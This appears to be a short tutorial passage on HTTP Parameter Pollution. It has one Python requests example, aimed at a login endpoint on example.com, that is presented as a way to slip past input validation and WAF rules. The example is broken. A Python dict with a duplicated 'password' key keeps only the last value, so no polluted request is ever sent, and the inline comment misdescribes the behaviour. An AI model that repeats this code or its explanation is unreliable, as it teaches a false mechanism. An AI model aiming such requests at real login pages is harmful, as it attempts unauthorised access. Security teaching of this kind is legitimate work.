HTTP Parameter Pollution (HPP) is a technique where an attacker injects additional parameters into an HTTP request to manipulate how the server processes the input. This can bypass input validation and WAF rules in some cases.

Here are examples in different languages to demonstrate HPP attacks:

## Python (using requests library)

```python
import requests

# Target URL with vulnerable parameter
url = "https://example.com/login"

# Normal request
normal_params = {
    'username': 'admin',
    'password': 'password123'
}

# HPP attack by adding duplicate parameter
hpp_params = {
    'username': 'admin',
    'password': 'wrongpass',
    'password': 'correctpass'  # This will overwrite the previous password in some implementations
}

# Send the request
response = requests.get(url, params=hpp_params)
print(response.text)
```

